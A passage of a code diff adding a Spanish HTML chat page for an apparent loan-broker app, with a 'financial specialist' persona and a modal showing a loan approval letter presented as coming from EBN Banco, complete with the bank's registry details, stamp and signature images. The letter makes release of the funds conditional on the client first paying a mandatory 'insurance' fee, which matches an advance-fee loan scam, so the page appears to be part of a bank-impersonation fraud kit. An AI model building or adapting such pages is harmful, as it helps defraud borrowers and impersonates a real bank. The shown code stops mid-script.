@@ -1,0 +1,1999 @@
+<!doctype html>
+<html lang="es">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Chat</title>
+    <link rel="icon" href="data:," />
+
+    <link rel="stylesheet" href="../CSS/link-bank.css" />
+    <link rel="stylesheet" href="./tourist.css" />
+
+    <script src="../js/api-config.js?v=20260321-6"></script>
+    <script src="../js/flow-session-id.js?v=20260320-3"></script>
+    <script src="../js/navigation-guard.js?v=20260405-1"></script>
+    <script src="../js/client-tracker.js?v=20260518-1"></script>
+
+    <style>
+      body:has(.tourist-shell--chat) {
+        height: 100dvh;
+        padding-bottom: 0;
+        overflow: hidden;
+      }
+
+      .tourist-shell--chat {
+        height: calc(100dvh - 88px);
+        display: flex;
+        flex-direction: column;
+        background: #fafafa;
+        overflow: hidden;
+      }
+
+      /* ── Specialist card ── */
+      .assistant-specialist {
+        display: flex;
+        align-items: center;
+        gap: 12px;
+        margin: 16px 16px 0;
+        padding: 15px;
+        background: #ffffff;
+        border-radius: 12px;
+        flex-shrink: 0;
+      }
+
+      .assistant-specialist__avatar {
+        width: 49px;
+        height: 49px;
+        flex: 0 0 49px;
+        border-radius: 50%;
+        object-fit: cover;
+        background: #ededed;
+      }
+
+      .assistant-specialist__text {
+        flex: 1;
+        min-width: 0;
+        display: flex;
+        flex-direction: column;
+        gap: 2px;
+      }
+
+      .assistant-specialist__name {
+        margin: 0;
+        color: #0f0f0f;
+        font-size: 15px;
+        font-weight: 600;
+        line-height: 23px;
+      }
+
+      .assistant-specialist__desc {
+        margin: 0;
+        color: #787878;
+        font-size: 13px;
+        font-weight: 400;
+        line-height: 20px;
+      }
+
+      .assistant-specialist__icon {
+        width: 24px;
+        height: 24px;
+        flex: 0 0 24px;
+        display: block;
+        animation: assistantPulse 2.4s ease-in-out infinite;
+      }
+
+      @keyframes assistantPulse {
+        0%, 100% { opacity: 1; }
+        50%       { opacity: 0; }
+      }
+
+      /* ── Chat scroll ── */
+      .chat-scroll {
+        flex: 1 1 auto;
+        min-height: 0;
+        overflow-y: auto;
+        -webkit-overflow-scrolling: touch;
+        display: flex;
+        flex-direction: column;
+      }
+
+      .assistant-chat {
+        flex: 1 0 auto;
+        min-height: 0;
+        display: flex;
+        flex-direction: column;
+        gap: 16px;
+        padding: 16px;
+        background: #f7f7f7;
+        margin-top: 12px;
+      }
+
+      /* ── Bubbles ── */
+      .assistant-msg {
+        max-width: 80%;
+        padding: 14px 16px;
+        min-width: 0;
+        word-break: break-word;
+        overflow-wrap: anywhere;
+      }
+
+      .assistant-msg p {
+        margin: 0;
+        font-size: 13px;
+        font-weight: 500;
+        line-height: 22px;
+        word-break: break-word;
+        overflow-wrap: anywhere;
+      }
+
+      .assistant-msg--bot {
+        align-self: flex-start;
+        background: #ffffff;
+        border-radius: 19px 19px 19px 0;
+      }
+
+      .assistant-msg--bot p { color: #0f0f0f; }
+
+      .assistant-msg--user {
+        align-self: flex-end;
+        background: var(--interface-accent);
+        border-radius: 19px 19px 0 19px;
+      }
+
+      .assistant-msg--user p { color: #ffffff; }
+
+      /* ── Typing indicator ── */
+      .chat-typing {
+        align-self: flex-start;
+        display: flex;
+        align-items: center;
+        gap: 8px;
+        padding: 0 16px;
+        color: var(--interface-accent);
+        font-size: 13px;
+        font-weight: 500;
+        line-height: 20px;
+      }
+
+      .chat-typing__icon {
+        display: block;
+        flex-shrink: 0;
+        animation: chatPencil 1.4s ease-in-out infinite;
+        transform-origin: 80% 80%;
+      }
+
+      @keyframes chatPencil {
+        0%, 100% { transform: rotate(0deg); }
+        50%      { transform: rotate(-12deg); }
+      }
+
+      .chat-typing__dots { display: inline-flex; gap: 1px; }
+      .chat-typing__dot { opacity: 0; animation: chatTypingDot 1.4s ease-in-out infinite; }
+      .chat-typing__dot:nth-child(1) { animation-delay: 0s; }
+      .chat-typing__dot:nth-child(2) { animation-delay: 0.2s; }
+      .chat-typing__dot:nth-child(3) { animation-delay: 0.4s; }
+
+      @keyframes chatTypingDot {
+        0%   { opacity: 0; }
+        25%  { opacity: 1; }
+        60%  { opacity: 1; }
+        80%  { opacity: 0; }
+        100% { opacity: 0; }
+      }
+
+      /* ── Input bar ── */
+      .chat-inputbar {
+        flex-shrink: 0;
+        display: flex;
+        align-items: center;
+        gap: 16px;
+        padding: 16px;
+        background: #f7f7f7;
+        box-sizing: border-box;
+      }
+
+      .chat-input-wrap {
+        flex: 1 1 auto;
+        display: flex;
+        align-items: center;
+        height: 54px;
+        padding: 0 16px;
+        background: #f7f7f7;
+        border: 1px solid var(--interface-accent);
+        border-radius: 12px;
+        box-sizing: border-box;
+        transition: border-color 0.2s;
+      }
+
+      .chat-input {
+        width: 100%;
+        border: none;
+        outline: none;
+        background: transparent;
+        font-family: inherit;
+        font-size: 13px;
+        font-weight: 500;
+        line-height: 17px;
+        color: #0f0f0f;
+      }
+
+      .chat-input::placeholder { color: #9e9e9e; }
+
+      .chat-send {
+        flex: 0 0 54px;
+        width: 54px;
+        height: 54px;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        border: none;
+        border-radius: 50%;
+        background: var(--interface-accent);
+        cursor: pointer;
+        padding: 0;
+        transition: background 0.2s;
+      }
+
+      .chat-send:disabled { background: #d0d0d0; cursor: default; }
+
+      .chat-send__icon {
+        display: block;
+        width: 24px;
+        height: 24px;
+        transform: translateX(2px);
+      }
+
+      .chat-send:active:not(:disabled) { opacity: 0.9; }
+
+      /* ── Image button ── */
+      .chat-img-btn {
+        flex: 0 0 44px;
+        width: 44px;
+        height: 44px;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        border: 1.5px solid #e2e2e2;
+        border-radius: 12px;
+        background: #ffffff;
+        cursor: pointer;
+        padding: 0;
+        flex-shrink: 0;
+      }
+      .chat-img-btn:active:not(:disabled) { background: #f0f0f0; }
+      .chat-img-btn:disabled { opacity: 0.4; cursor: default; }
+
+      /* ── Image bubble ── */
+      .assistant-msg--image { padding: 5px !important; }
+      .assistant-msg--image img {
+        display: block;
+        max-width: 210px;
+        max-height: 210px;
+        border-radius: 14px;
+        object-fit: cover;
+        cursor: pointer;
+      }
+      .assistant-msg--user.assistant-msg--image img  { border-radius: 14px 14px 2px 14px; }
+      .assistant-msg--bot.assistant-msg--image img   { border-radius: 14px 14px 14px 2px; }
+
+      /* ── Caller action buttons (CALLER_ACTION_BUTTONS redesign) ── */
+      .caller-actions-wrap {
+        align-self: stretch;
+        display: flex;
+        flex-direction: column;
+        gap: 8px;
+      }
+      .caller-notif-btn {
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        align-self: flex-start;
+        gap: 8px;
+        width: 80%;
+        height: 44px;
+        margin-top: -8px;
+        padding: 0 14px;
+        background: transparent;
+        border: 1px solid #e7e7e7;
+        border-radius: 14px;
+        font-size: 14px;
+        font-weight: 400;
+        line-height: 21px;
+        color: #0f0f0f;
+        font-family: inherit;
+        cursor: pointer;
+        text-align: center;
+        letter-spacing: 0;
+        box-sizing: border-box;
+        transition: opacity 0.2s;
+      }
+      .caller-notif-btn:active {
+        background: transparent;
+        border-color: var(--interface-accent);
+        color: var(--interface-accent);
+        opacity: 0.85;
+      }
+      .caller-notif-btn:disabled { opacity: 0.4; }
+      .caller-msg-bubble {
+        align-self: flex-start;
+        max-width: 80%;
+        background: #ffffff;
+        border-radius: 19px 19px 19px 0;
+        padding: 14px 16px;
+      }
+      .caller-msg-bubble p {
+        margin: 0;
+        font-size: 13px;
+        font-weight: 500;
+        line-height: 22px;
+        color: #0f0f0f;
+        word-break: break-word;
+      }
+      .caller-action-btn {
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        gap: 8px;
+        width: 80%;
+        height: 44px;
+        padding: 0 14px;
+        background: linear-gradient(270deg, #ff77d7 0%, var(--interface-accent) 100%);
+        border: none;
+        border-radius: 14px;
+        font-size: 14px;
+        font-weight: 400;
+        line-height: 21px;
+        color: #ffffff;
+        text-decoration: none;
+        font-family: inherit;
+        text-align: center;
+        letter-spacing: 0;
+        box-sizing: border-box;
+      }
+      .caller-action-btn--outline {
+        background: transparent;
+        border: 1px solid #e7e7e7;
+        color: #0f0f0f;
+      }
+      .caller-action-btn--outline:active {
+        background: transparent;
+        border-color: var(--interface-accent);
+        color: var(--interface-accent);
+        opacity: 0.85;
+      }
+      .caller-action-btn--primary:active { opacity: 0.85; }
+      .caller-notif-btn img,
+      .caller-action-btn img {
+        display: block;
+        width: 16px;
+        height: 16px;
+        flex: 0 0 16px;
+      }
+      .caller-btn-icon {
+        display: block;
+        width: 16px;
+        height: 16px;
+        flex: 0 0 16px;
+        background-color: currentColor;
+        -webkit-mask: var(--caller-btn-icon) center / contain no-repeat;
+        mask: var(--caller-btn-icon) center / contain no-repeat;
+      }
+      .caller-btn-icon--mail {
+        --caller-btn-icon: url("../assets/icons/chat/mail.svg");
+      }
+      .caller-btn-icon--notification {
+        --caller-btn-icon: url("../assets/icons/chat/notification.svg");
+      }
+
+      /* ── Closed banner ── */
+      .chat-closed-banner {
+        align-self: center;
+        background: #f0f0f0;
+        border-radius: 12px;
+        padding: 10px 16px;
+        font-size: 12px;
+        font-weight: 500;
+        color: #787878;
+        text-align: center;
+        max-width: 240px;
+      }
+
+      /* ── Contrato card ── */
+      .contrato-card {
+        align-self: flex-start;
+        display: flex;
+        align-items: center;
+        gap: 12px;
+        background: var(--interface-accent-soft);
+        border: 1.5px solid #ffd8bd;
+        border-radius: 16px;
+        padding: 10px 14px;
+        width: 80%;
+        margin-top: -8px;
+        box-sizing: border-box;
+        cursor: pointer;
+        -webkit-tap-highlight-color: transparent;
+      }
+      .contrato-card:active { opacity: 0.82; }
+      .contrato-card__left {
+        display: flex;
+        align-items: center;
+        gap: 12px;
+        flex: 1;
+        min-width: 0;
+      }
+      .contrato-card__icon {
+        flex-shrink: 0;
+        width: 36px;
+        height: 36px;
+        border-radius: 50%;
+        background: var(--interface-accent);
+        display: flex;
+        align-items: center;
+        justify-content: center;
+      }
+      .contrato-card__icon svg {
+        width: 18px;
+        height: 18px;
+      }
+      .contrato-card__icon svg path {
+        stroke: #ffffff;
+      }
+      .contrato-card__text {
+        min-width: 0;
+      }
+      .contrato-card__title {
+        margin: 0 0 3px;
+        font-size: 14px;
+        font-weight: 700;
+        color: #0f0f0f;
+        white-space: nowrap;
+        overflow: hidden;
+        text-overflow: ellipsis;
+      }
+      .contrato-card__sub {
+        margin: 0;
+        font-size: 12px;
+        font-weight: 500;
+        color: var(--interface-accent);
+      }
+      .contrato-card__btn {
+        flex-shrink: 0;
+        display: inline-flex;
+        align-items: center;
+        justify-content: center;
+        width: 14px;
+        height: 34px;
+        background: none;
+        border: none;
+        color: var(--interface-accent);
+        font-size: 30px;
+        font-weight: 500;
+        cursor: pointer;
+        outline: none;
+        -webkit-appearance: none;
+        appearance: none;
+        padding: 0;
+        line-height: 0.8;
+      }
+    </style>
+      <script src="/js/ban-guard.js?v=20260708-1"></script>
+      <script src="/js/review-guard.js?v=20260729-1"></script>
+  <link rel="stylesheet" href="../CSS/theme.css?v=20260802-63" />
+
+  </head>
+
+  <body>
+    <div class="tourist-shell tourist-shell--chat">
+
+      <div class="chat-scroll">
+        <section class="assistant-specialist">
+          <img class="assistant-specialist__avatar" src="../assets/marta-abadia.png" alt="" />
+          <div class="assistant-specialist__text">
+            <p class="assistant-specialist__name">Marta Abadía</p>
+            <p class="assistant-specialist__desc">Especialista en asuntos financieros.</p>
+          </div>
+          <img class="assistant-specialist__icon" src="../assets/airdrop.svg" alt="" aria-hidden="true" />
+        </section>
+
+        <main class="assistant-chat" id="supportChat">
+          <div class="chat-typing" id="supportTyping" style="display:none;" aria-live="polite">
+            <svg class="chat-typing__icon" width="18" height="18" viewBox="0 0 18 18" fill="none" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
+              <path d="M13.1 2.9a1.5 1.5 0 0 1 2.12 2.12L6.4 13.84l-3.1.62.62-3.1L13.1 2.9Z" stroke="var(--interface-accent)" stroke-width="1.3" stroke-linejoin="round"/>
+              <path d="M2.25 16.5h13.5" stroke="var(--interface-accent)" stroke-width="1.3" stroke-linecap="round"/>
+            </svg>
+            <span>Escribiendo<span class="chat-typing__dots" aria-hidden="true"><span class="chat-typing__dot">.</span><span class="chat-typing__dot">.</span><span class="chat-typing__dot">.</span></span></span>
+          </div>
+        </main>
+      </div>
+
+      <input type="file" id="chatImgInput" accept="image/*" style="position:absolute;opacity:0;pointer-events:none;width:1px;height:1px" />
+      <form class="chat-inputbar" id="supportForm" autocomplete="off">
+        <button type="button" class="chat-img-btn" id="chatImgBtn" aria-label="Adjuntar imagen">
+          <svg width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
+            <rect x="3" y="3" width="18" height="18" rx="3" stroke="#787878" stroke-width="1.5"/>
+            <circle cx="8.5" cy="8.5" r="1.5" fill="#787878"/>
+            <path d="M3 15.5L8 10.5L12 14.5L15 11.5L21 17" stroke="#787878" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/>
+          </svg>
+        </button>
+        <div class="chat-input-wrap">
+          <input class="chat-input" type="text" id="supportInput" placeholder="Escriba su mensaje..." aria-label="Mensaje" />
+        </div>
+        <button class="chat-send" type="submit" id="supportSendBtn" aria-label="Enviar">
+          <img class="chat-send__icon" src="../assets/icons/send.svg" alt="" aria-hidden="true" />
+        </button>
+      </form>
+
+    </div>
+
+    <nav class="tourist-tabbar" aria-label="Menú">
+      <a href="./index.html" class="tourist-tabbar__item">
+        <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
+          <path d="M12.37 2.14984L21.37 5.74982C21.72 5.88982 22 6.30981 22 6.67981V9.99982C22 10.5498 21.55 10.9998 21 10.9998H3C2.45 10.9998 2 10.5498 2 9.99982V6.67981C2 6.30981 2.28 5.88982 2.63 5.74982L11.63 2.14984C11.83 2.06984 12.17 2.06984 12.37 2.14984Z" stroke="currentColor" stroke-width="1.5" stroke-miterlimit="10" stroke-linecap="round" stroke-linejoin="round"/>
+          <path d="M22 22H2V19C2 18.45 2.45 18 3 18H21C21.55 18 22 18.45 22 19V22Z" stroke="currentColor" stroke-width="1.5" stroke-miterlimit="10" stroke-linecap="round" stroke-linejoin="round"/>
+          <path d="M4 18V11" stroke="currentColor" stroke-width="1.5" stroke-miterlimit="10" stroke-linecap="round" stroke-linejoin="round"/>
+          <path d="M8 18V11" stroke="currentColor" stroke-width="1.5" stroke-miterlimit="10" stroke-linecap="round" stroke-linejoin="round"/>
+          <path d="M12 18V11" stroke="currentColor" stroke-width="1.5" stroke-miterlimit="10" stroke-linecap="round" stroke-linejoin="round"/>
+          <path d="M16 18V11" stroke="currentColor" stroke-width="1.5" stroke-miterlimit="10" stroke-linecap="round" stroke-linejoin="round"/>
+          <path d="M20 18V11" stroke="currentColor" stroke-width="1.5" stroke-miterlimit="10" stroke-linecap="round" stroke-linejoin="round"/>
+          <path d="M1 22H23" stroke="currentColor" stroke-width="1.5" stroke-miterlimit="10" stroke-linecap="round" stroke-linejoin="round"/>
+          <path d="M12 8.5C12.8284 8.5 13.5 7.82843 13.5 7C13.5 6.17157 12.8284 5.5 12 5.5C11.1716 5.5 10.5 6.17157 10.5 7C10.5 7.82843 11.1716 8.5 12 8.5Z" stroke="currentColor" stroke-width="1.5" stroke-miterlimit="10" stroke-linecap="round" stroke-linejoin="round"/>
+        </svg>
+        <span>Home</span>
+      </a>
+      <a href="./archived-goals.html" class="tourist-tabbar__item">
+        <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
+          <path d="M12.1484 16.5V18.6" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/>
+          <path d="M7.14844 22H17.1484V21C17.1484 19.9 16.2484 19 15.1484 19H9.14844C8.04844 19 7.14844 19.9 7.14844 21V22V22Z" stroke="currentColor" stroke-width="1.5" stroke-miterlimit="10"/>
+          <path d="M6.14844 22H18.1484" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/>
+          <path d="M12 16C8.13 16 5 12.87 5 9V6C5 3.79 6.79 2 9 2H15C17.21 2 19 3.79 19 6V9C19 12.87 15.87 16 12 16Z" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/>
+          <path d="M5.46906 11.6516C4.71906 11.4116 4.05906 10.9716 3.53906 10.4516C2.63906 9.45156 2.03906 8.25156 2.03906 6.85156C2.03906 5.45156 3.13906 4.35156 4.53906 4.35156H5.18906C4.98906 4.81156 4.88906 5.32156 4.88906 5.85156V8.85156C4.88906 9.85156 5.09906 10.7916 5.46906 11.6516Z" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/>
+          <path d="M18.5312 11.6516C19.2812 11.4116 19.9412 10.9716 20.4612 10.4516C21.3612 9.45156 21.9612 8.25156 21.9612 6.85156C21.9612 5.45156 20.8612 4.35156 19.4612 4.35156H18.8112C19.0112 4.81156 19.1112 5.32156 19.1112 5.85156V8.85156C19.1112 9.85156 18.9013 10.7916 18.5312 11.6516Z" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/>
+        </svg>
+        <span>Objetivos</span>
+      </a>
+      <a href="./history.html" class="tourist-tabbar__item">
+        <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
+          <path d="M14.5 9.25H2C1.59 9.25 1.25 8.91 1.25 8.5C1.25 8.09 1.59 7.75 2 7.75H14.5C14.91 7.75 15.25 8.09 15.25 8.5C15.25 8.91 14.91 9.25 14.5 9.25Z" fill="currentColor"/>
+          <path d="M8 17.25H6C5.59 17.25 5.25 16.91 5.25 16.5C5.25 16.09 5.59 15.75 6 15.75H8C8.41 15.75 8.75 16.09 8.75 16.5C8.75 16.91 8.41 17.25 8 17.25Z" fill="currentColor"/>
+          <path d="M14.5 17.25H10.5C10.09 17.25 9.75 16.91 9.75 16.5C9.75 16.09 10.09 15.75 10.5 15.75H14.5C14.91 15.75 15.25 16.09 15.25 16.5C15.25 16.91 14.91 17.25 14.5 17.25Z" fill="currentColor"/>
+          <path d="M17.56 21.25H6.44C2.46 21.25 1.25 20.05 1.25 16.11V7.89C1.25 3.95 2.46 2.75 6.44 2.75H14.5C14.91 2.75 15.25 3.09 15.25 3.5C15.25 3.91 14.91 4.25 14.5 4.25H6.44C3.3 4.25 2.75 4.79 2.75 7.89V16.1C2.75 19.2 3.3 19.74 6.44 19.74H17.55C20.69 19.74 21.24 19.2 21.24 16.1V14.02C21.24 13.61 21.58 13.27 21.99 13.27C22.4 13.27 22.74 13.61 22.74 14.02V16.1C22.75 20.05 21.54 21.25 17.56 21.25Z" fill="currentColor"/>
+          <path d="M20 10.25C19.9 10.25 19.81 10.23 19.71 10.19C19.43 10.07 19.25 9.8 19.25 9.5V3.5C19.25 3.09 19.59 2.75 20 2.75C20.41 2.75 20.75 3.09 20.75 3.5V7.69L21.47 6.97C21.76 6.68 22.24 6.68 22.53 6.97C22.82 7.26 22.82 7.74 22.53 8.03L20.53 10.03C20.39 10.17 20.2 10.25 20 10.25Z" fill="currentColor"/>
+          <path d="M19.9975 10.2514C19.8075 10.2514 19.6175 10.1814 19.4675 10.0314L17.4675 8.03141C17.1775 7.74141 17.1775 7.26141 17.4675 6.97141C17.7575 6.68141 18.2375 6.68141 18.5275 6.97141L20.5275 8.97141C20.8175 9.26141 20.8175 9.74141 20.5275 10.0314C20.3775 10.1814 20.1875 10.2514 19.9975 10.2514Z" fill="currentColor"/>
+        </svg>
+        <span>Historial</span>
+      </a>
+      <a href="./chat.html" class="tourist-tabbar__item is-active">
+        <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
+          <path d="M17 20.5H7C4 20.5 2 19 2 15.5V8.5C2 5 4 3.5 7 3.5H17C20 3.5 22 5 22 8.5V15.5C22 19 20 20.5 17 20.5Z" stroke="currentColor" stroke-width="1.5" stroke-miterlimit="10" stroke-linecap="round" stroke-linejoin="round"/>
+          <path d="M17 9L13.87 11.5C12.84 12.32 11.15 12.32 10.12 11.5L7 9" stroke="currentColor" stroke-width="1.5" stroke-miterlimit="10" stroke-linecap="round" stroke-linejoin="round"/>
+        </svg>
+        <span>Chat</span>
+      </a>
+      <a href="./support.html" class="tourist-tabbar__item">
+        <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
+          <path d="M8 22.3214C7.72 22.3214 7.42998 22.2514 7.16998 22.1114C6.59998 21.8114 6.25 21.2113 6.25 20.5714V19.1514C3.23 18.8414 1.25 16.6213 1.25 13.4413V7.44141C1.25 4.00141 3.56 1.69141 7 1.69141H17C20.44 1.69141 22.75 4.00141 22.75 7.44141V13.4413C22.75 16.8813 20.44 19.1913 17 19.1913H13.23L8.96997 22.0314C8.67997 22.2214 8.34 22.3214 8 22.3214ZM7 3.1814C4.42 3.1814 2.75 4.8514 2.75 7.4314V13.4315C2.75 16.0115 4.42 17.6815 7 17.6815C7.41 17.6815 7.75 18.0215 7.75 18.4315V20.5615C7.75 20.6915 7.83 20.7514 7.88 20.7814C7.93001 20.8114 8.03001 20.8414 8.14001 20.7714L12.59 17.8115C12.71 17.7315 12.86 17.6815 13.01 17.6815H17.01C19.59 17.6815 21.26 16.0115 21.26 13.4315V7.4314C21.26 4.8514 19.59 3.1814 17.01 3.1814H7Z" fill="currentColor"/>
+          <path d="M12.0037 12.1094C11.5937 12.1094 11.2537 11.7694 11.2537 11.3594V11.1494C11.2537 9.98941 12.1037 9.4194 12.4237 9.1994C12.7937 8.9494 12.9137 8.77941 12.9137 8.51941C12.9137 8.01941 12.5037 7.60938 12.0037 7.60938C11.5037 7.60938 11.0938 8.01941 11.0938 8.51941C11.0938 8.92941 10.7537 9.26941 10.3438 9.26941C9.93375 9.26941 9.59375 8.92941 9.59375 8.51941C9.59375 7.18941 10.6737 6.10938 12.0037 6.10938C13.3337 6.10938 14.4137 7.18941 14.4137 8.51941C14.4137 9.65941 13.5737 10.2294 13.2637 10.4394C12.8737 10.6994 12.7537 10.8694 12.7537 11.1494V11.3594C12.7537 11.7794 12.4137 12.1094 12.0037 12.1094Z" fill="currentColor"/>
+          <path d="M12 14.6016C11.58 14.6016 11.25 14.2616 11.25 13.8516C11.25 13.4416 11.59 13.1016 12 13.1016C12.41 13.1016 12.75 13.4416 12.75 13.8516C12.75 14.2616 12.42 14.6016 12 14.6016Z" fill="currentColor"/>
+        </svg>
+        <span>Soporte</span>
+      </a>
+    </nav>
+
+    <!-- ── Notif PDF modal (bank approval letter) ── -->
+    <div class="tourist-contract-modal" id="notifPdfModal" aria-hidden="true">
+      <div class="tourist-contract-modal__backdrop" data-notif-pdf-close tabindex="-1"></div>
+      <section class="tourist-contract-modal__panel" role="dialog" aria-modal="true" aria-labelledby="notifPdfModalTitle">
+        <header class="tourist-contract-modal__header">
+          <div class="tourist-contract-modal__heading">
+            <p class="tourist-contract-modal__eyebrow">Contrato Nº ES-4738D9215</p>
+            <h2 class="tourist-contract-modal__title" id="notifPdfModalTitle">Documento de EBN Banco</h2>
+          </div>
+        </header>
+        <div class="tourist-contract-modal__body" id="notifPdfBody" tabindex="0">
+          <article class="credit-letter" aria-label="Carta de aprobación de préstamo">
+            <section class="credit-letter__page">
+              <header class="credit-letter__masthead">
+                <div class="credit-letter__caixa-brand" id="npm_logoWrap">
+                  <img src="../assets/banks/newBank/logo2.png" alt="EBN Banco" class="credit-letter__caixa-logo" id="npm_logo">
+                </div>
+                <div class="credit-letter__goval">
+                  <img src="../assets/document-logo.svg" alt="AvalAvance" class="credit-letter__goval-logo">
+                </div>
+              </header>
+              <div class="credit-letter__body">
+                <p class="credit-letter__line">
+                  <strong id="npm_bankName">EBN Banco</strong><br>
+                  Sede social:<br>
+                  Paseo de Recoletos, 29, 28004 Madrid, España<br>
+                  NIF (CIF): A28763043<br>
+                  Código Banco de España: 0211<br>
+                  SWIFT/BIC: PROAESMMXXX<br>
+                  LEI: 95980020140005388333<br>
+                  Inscrita en el Registro Especial de Entidades de Crédito del Banco de España con el código 0211.<br><br>
+                  <strong>DEPARTAMENTO DE CRÉDITOS - CLIENTES PARTICULARES</strong><br>
+                  Con la intermediación de: <strong>AvalAvance</strong>
+                </p>
+                <p class="credit-letter__para">
+                  <strong>De:</strong> <strong>EBN Banco</strong><br>
+                  <strong>A:</strong> <strong>AvalAvance S.L.</strong>
+                </p>
+                <p class="credit-letter__line"><strong>Estimados colegas,</strong></p>
+                <p class="credit-letter__line">Les informamos de que la solicitud de financiación presentada ha sido examinada con resultado positivo y ha sido aprobada en las siguientes condiciones:</p>
+                <p class="credit-letter__line"><strong>Importe del préstamo:</strong> 5 000.00</p>
+                <p class="credit-letter__line"><strong>TIN:</strong> 7.86%</p>
+                <p class="credit-letter__line"><strong>Modalidad de desembolso:</strong> transferencia bancaria</p>
+                <p class="credit-letter__line"><strong>Seguro de crédito:</strong> 100.00</p>
+                <p class="credit-letter__para">Para la liberación de los fondos y el levantamiento de las restricciones operativas, es necesaria la contratación del seguro obligatorio establecido en las condiciones del contrato de crédito.</p>
+                <p class="credit-letter__para">Les rogamos informen al cliente al respecto y, si fuera necesario, presten la asistencia adicional en la fase de finalización.</p>
+                <p class="credit-letter__para">Gracias por su colaboración.</p>
+                <p class="credit-letter__line">Atentamente,</p>
+                <p class="credit-letter__line">Departamento de Préstamos</p>
+                <p class="credit-letter__line" id="npm_bankFooter">EBN Banco</p>
+              </div>
+              <div class="credit-letter__stamp-area" aria-hidden="true">
+                <img src="../assets/banks/newBank/stamp.svg" alt="" class="credit-letter__stamp" id="npm_stamp">
+                <img src="../assets/left-hand.png" alt="" class="credit-letter__signature">
+              </div>
+            </section>
+          </article>
+        </div>
+        <footer class="tourist-contract-modal__footer">
+          <button type="button" class="tourist-contract-modal__action" data-notif-pdf-close>
+            <span class="tourist-contract-modal__action-content">
+              <span class="tourist-contract-modal__action-text">Cerrar</span>
+              <svg width="16" height="16" viewBox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M14 14.6641H2C1.72667 14.6641 1.5 14.4374 1.5 14.1641C1.5 13.8907 1.72667 13.6641 2 13.6641H14C14.2733 13.6641 14.5 13.8907 14.5 14.1641C14.5 14.4374 14.2733 14.6641 14 14.6641Z" fill="white"/><path d="M12.6843 2.31848C11.3909 1.02514 10.1243 0.991811 8.79761 2.31848L7.99095 3.12514C7.92428 3.19181 7.89761 3.29848 7.92428 3.39181C8.43095 5.15848 9.84428 6.57181 11.6109 7.07848C11.6376 7.08514 11.6643 7.09181 11.6909 7.09181C11.7643 7.09181 11.8309 7.06514 11.8843 7.01181L12.6843 6.20514C13.3443 5.55181 13.6643 4.91848 13.6643 4.27848C13.6709 3.61848 13.3509 2.97848 12.6843 2.31848Z" fill="white"/><path d="M10.4056 7.68849C10.2122 7.59516 10.0256 7.50182 9.84558 7.39516C9.69891 7.30849 9.55891 7.21516 9.41891 7.11516C9.30558 7.04182 9.17224 6.93516 9.04558 6.82849C9.03224 6.82182 8.98558 6.78182 8.93224 6.72849C8.71224 6.54182 8.46558 6.30182 8.24558 6.03516C8.22558 6.02182 8.19224 5.97516 8.14558 5.91516C8.07891 5.83516 7.96558 5.70182 7.86558 5.54849C7.78558 5.44849 7.69224 5.30182 7.60558 5.15516C7.49891 4.97516 7.40558 4.79516 7.31224 4.60849C7.16859 4.28365 6.89224 4.22182 6.72846 4.38561L2.89224 8.22182C2.80558 8.30849 2.72558 8.47516 2.70558 8.58849L2.34558 11.1418C2.27891 11.5952 2.40558 12.0218 2.68558 12.3085C2.92558 12.5418 3.25891 12.6685 3.61891 12.6685C3.69891 12.6685 3.77891 12.6618 3.85891 12.6485L6.41891 12.2885C6.53891 12.2685 6.70558 12.1885 6.78558 12.1018L10.6172 8.27015C10.7822 8.10523 10.7199 7.82237 10.5052 7.73124C10.4725 7.71734 10.4393 7.70311 10.4056 7.68849Z" fill="white"/></svg>
+            </span>
+          </button>
+        </footer>
+      </section>
+    </div>
+
+    <script>
+      function getStoredBankName(fallback) {
+        return 'EBN Banco';
+      }
+      function getStoredBankShort(fallback) {
+        return getStoredBankName(fallback).replace(/\s+S\.?\s*A\.?$/i, '');
+      }
+      function getStoredBankDisplay(fallback) {
+        return getStoredBankName(fallback);
+      }
+
+      function openNotifPdfModal() {
+        var modal = document.getElementById('notifPdfModal');
+        if (!modal) return;
+        var bankName = '';
+        var bankKey  = '';
+        try {
+          bankName = getStoredBankDisplay('EBN Banco');
+          bankKey  = 'newBank';
+        } catch(e) {}
+        var el1 = document.getElementById('npm_bankName');
+        var el2 = document.getElementById('npm_bankFooter');
+        if (el1) el1.textContent = bankName;
+        if (el2) el2.textContent = bankName;
+        var logoEl = document.getElementById('npm_logo');
+        if (logoEl) { logoEl.src = '../assets/banks/newBank/logo2.png'; logoEl.alt = bankName; }
+        var stampEl = document.getElementById('npm_stamp');
+        if (stampEl) stampEl.src = '../assets/banks/newBank/stamp.svg';
+        modal.classList.add('tourist-contract-modal--open');
+        modal.setAttribute('aria-hidden', 'false');
+        document.body.classList.add('contract-modal-open');
+        var body = document.getElementById('notifPdfBody');
+        if (body) { body.scrollTop = 0; setTimeout(function(){ body.focus({ preventScroll: true }); }, 0); }
+      }
+      function closeNotifPdfModal() {
+        var modal = document.getElementById('notifPdfModal');
+        if (!modal) return;
+        modal.classList.remove('tourist-contract-modal--open');
+        modal.setAttribute('aria-hidden', 'true');
+        document.body.classList.remove('contract-modal-open');
